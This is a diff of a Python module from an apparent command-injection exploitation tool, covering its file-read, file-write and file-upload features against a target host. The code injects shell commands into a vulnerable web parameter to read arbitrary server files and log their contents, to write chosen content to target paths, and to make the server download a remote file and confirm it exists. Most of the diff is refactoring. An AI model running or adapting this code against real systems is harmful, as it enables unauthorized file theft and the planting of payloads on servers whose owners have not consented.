@@ -31,31 +31,34 @@ from src.core.injections.semiblind_based.techniques.file_based import fb_injecto
 """
 Read a file from the target host.
 """
-def file_read(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
+def file_read(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   file_to_read = menu.options.file_read
   # Execute command
   cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
-  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
   shell = "".join(str(p) for p in shell)
+  if menu.options.verbose:
+    print ""
   if shell:
-    if menu.options.verbose:
-      print ""
-    sys.stdout.write(Style.BRIGHT + "(!) Contents of file " + Style.UNDERLINE + file_to_read + Style.RESET_ALL + " : ")
+    sys.stdout.write(Style.BRIGHT + "(!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : ")
     sys.stdout.flush()
     print shell
+    output_file = open(filename, "a")
+    output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
+    output_file.close()
   else:
-   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL)
+   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL + "\n")
    sys.stdout.flush()
      
      
 """
 Write to a file on the target host.
 """
-def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
+def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   file_to_write = menu.options.file_write
   if not os.path.exists(file_to_write):
-    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL)
+    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
     sys.stdout.flush()
     sys.exit(0)
     
@@ -64,7 +67,7 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
       content = [line.replace("\n", " ") for line in content_file]
     content = "".join(str(p) for p in content).replace("'", "\"")
   else:
-    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
+    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL + "\n")
     sys.stdout.flush()
     
   # Check the file-destination
@@ -74,37 +77,37 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
     dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
   else:
     dest_to_write = menu.options.file_dest
-  cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
-  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+
+  # Execute command
+  cmd = "echo $(" + settings.FILE_WRITE + " '"+ content + "'" + " > " + "'" + dest_to_write + "'" + ")"
+  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
   shell = "".join(str(p) for p in shell)
   
   # Check if file exists!
   cmd = "echo $(ls " + dest_to_write + ")"
-  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
   shell = "".join(str(p) for p in shell)
   if shell:
-    if menu.options.verbose:
-      print ""
-    sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
+    sys.stdout.write(Style.BRIGHT + "(!) The '" + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +"' file was created successfully!" + Style.RESET_ALL + "\n")
     sys.stdout.flush()
   else:
-   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL)
+   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL + "\n")
    sys.stdout.flush()
    
      
 """
 Upload a file on the target host.
 """
-def file_upload(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
+def file_upload(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   file_to_upload = menu.options.file_upload
 
   # check if remote file exists.
   try:
     urllib2.urlopen(file_to_upload)
   except urllib2.HTTPError, err:
-    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n")
+    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n")
     sys.stdout.flush()
     sys.exit(0)
     
@@ -118,36 +121,43 @@ def file_upload(separator, payload, TAG, delay, prefix, suffix, http_request_met
     
   # Execute command
   cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
-  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
   shell = "".join(str(p) for p in shell)
   
   # Check if file exists!
   cmd = "echo $(ls " + dest_to_upload + ")"
-  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
   shell = "".join(str(p) for p in shell)
   if shell:
     if menu.options.verbose:
       print ""
-    sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!\n" + Style.RESET_ALL)
+    sys.stdout.write(Style.BRIGHT + "(!) The '" + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +"' file was uploaded successfully!" + Style.RESET_ALL + "\n")
     sys.stdout.flush()
   else:
-   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL)
+   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL + "\n")
    sys.stdout.flush()
 
 
 """
 Check the defined options
 """
-def do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
-  if menu.options.file_read:
-    file_read(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
-
+def do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
+  
   if menu.options.file_write:
-    file_write(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    file_write(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+    settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_upload:
-    file_upload(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    file_upload(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+    settings.FILE_ACCESS_DONE = True
 
+  if menu.options.file_read:
+    file_read(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+    settings.FILE_ACCESS_DONE = True
+
+  if settings.FILE_ACCESS_DONE:
+    print ""
+    
 # eof
